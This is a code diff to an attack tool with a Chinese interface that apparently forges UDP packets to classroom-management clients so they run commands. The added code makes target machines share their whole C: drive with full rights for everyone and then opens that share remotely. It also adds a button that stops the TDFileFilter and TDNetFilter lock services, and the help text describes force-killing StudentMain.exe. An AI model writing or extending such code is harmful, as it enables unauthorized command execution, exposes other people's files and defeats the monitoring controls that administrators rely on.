@@ -260,17 +260,23 @@ def action_share_local_disk(ip_text, port, loop_count, interval, content, log_ca
     r"""
     让目标机共享它自己的磁盘功能示例：
     在消息/命令内容中填写共享参数，例如 "MyC=C:\"
-    程序构造命令：cmd.exe /c net share MyC=C:\ /grant:everyone,full
+    构造命令：cmd.exe /c net share MyC=C:\ /grant:everyone,full
+    执行完后，自动在本机打开共享目录，例如 explorer.exe \\<目标IP>\MyC
     """
     if not content:
         log_callback("[-] 请填写共享参数，例如 'MyC=C:\\'")
         return
-    # 构造共享命令，注意反斜杠需要正确书写
+    # 构造共享命令，注意字符串中反斜杠要写成双反斜杠以正确生成单个反斜杠
     cmd = f'cmd.exe /c net share {content} /grant:everyone,full'
     data_list = pkg_sendlist('-c', cmd)
     data = bytes(data_list)
     targets = get_ip(ip_text)
+    if not targets:
+        log_callback("[-] 无法解析目标 IP")
+        return
     log_callback("[*] 发送本地共享命令...")
+
+    threads = []
 
     def send_task(ip):
         client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -286,7 +292,28 @@ def action_share_local_disk(ip_text, port, loop_count, interval, content, log_ca
         client.close()
 
     for ip in targets:
-        threading.Thread(target=send_task, args=(ip,)).start()
+        t = threading.Thread(target=send_task, args=(ip,))
+        t.start()
+        threads.append(t)
+
+    # 等待所有发送线程完成
+    for t in threads:
+        t.join()
+
+    log_callback("[*] 所有共享命令数据包发送完成。")
+
+    # 自动在本机打开共享目录
+    # 假设共享名为 content 分隔符 "=" 前面的部分
+    share_name = content.split('=')[0].strip()
+    # 使用第一个目标 IP 作为访问地址
+    target_ip = targets[0]
+    unc_path = f"\\\\{target_ip}\\{share_name}"
+    log_callback(f"[*] 尝试打开共享目录：{unc_path}")
+    try:
+        # 调用 explorer 打开 UNC 路径
+        system(f'start explorer.exe "{unc_path}"')
+    except Exception as e:
+        log_callback(f"[-] 打开共享目录失败: {e}")
 
 def action_kill_studentmain_nt(log_callback):
     """
@@ -363,6 +390,17 @@ def action_share_local_disk(ip_text, port, loop_count, interval, content, log_ca
     for ip in targets:
         threading.Thread(target=send_task, args=(ip,)).start()
 
+def action_unlock(log_callback):
+    """
+    解除文件、键盘、应用锁和网络锁：
+      执行命令：sc stop TDFileFilter 和 sc stop TDNetFilter
+    """
+    try:
+        popen("sc stop TDFileFilter")
+        popen("sc stop TDNetFilter")
+        log_callback("[+] 成功执行解除锁定命令 (TDFileFilter 和 TDNetFilter)")
+    except Exception as e:
+        log_callback(f"[-] 解除锁定失败: {e}")
 
 # ==============================
 # InfoDialog：使用说明
@@ -388,8 +426,9 @@ class InfoDialog(QDialog):
             "9. 多网卡自动检测：点击“检测本机网卡”自动填充 -ip\n"
             "10. 循环发送：-l 设置循环次数，-t 设置发送间隔\n"
             "11. 磁盘共享：选择 'map'，在命令内容中填写共享参数，例如 'MyC=C:\\'\n"
-            "12. 强制结束 StudentMain.exe：选择 'kill'，使用 NT API 强制结束该进程\n\n"
-            "注意：请确保目标环境允许UDP数据包重放，并具备相应权限。"
+            "12. 解除锁定：点击专用大按钮执行 sc stop TDFileFilter 和 sc stop TDNetFilter\n"
+            "13. 强制结束 StudentMain.exe：选择 'kill'，使用 NT API 强制结束该进程\n\n"
+            "注意：请确保目标环境允许 UDP 数据包重放，并具备相应权限。"
         )
         scroll = QScrollArea()
         content_label = QLabel(info_text)
@@ -501,7 +540,7 @@ class MainWindow(QMainWindow):
         self.progressBar.setValue(0)
         main_layout.addWidget(self.progressBar)
 
-        # 按钮区域：使用教程和扫描内网
+        # 按钮区域：使用教程、扫描内网、以及解除锁定（专用大按钮）
         buttons_layout = QHBoxLayout()
         info_button = QPushButton("使用教程(以及关于)")
         info_button.setFixedHeight(40)
@@ -511,8 +550,13 @@ class MainWindow(QMainWindow):
         scan_button.setFixedHeight(40)
         scan_button.setStyleSheet("font-size: 16px;")
         scan_button.clicked.connect(self.scanNetwork)
+        unlock_button = QPushButton("解除锁定")
+        unlock_button.setFixedHeight(40)
+        unlock_button.setStyleSheet("font-size: 16px;")
+        unlock_button.clicked.connect(lambda: threading.Thread(target=action_unlock, args=(self.log,)).start())
         buttons_layout.addWidget(info_button)
         buttons_layout.addWidget(scan_button)
+        buttons_layout.addWidget(unlock_button)
         main_layout.addLayout(buttons_layout)
 
         # 发送/执行按钮
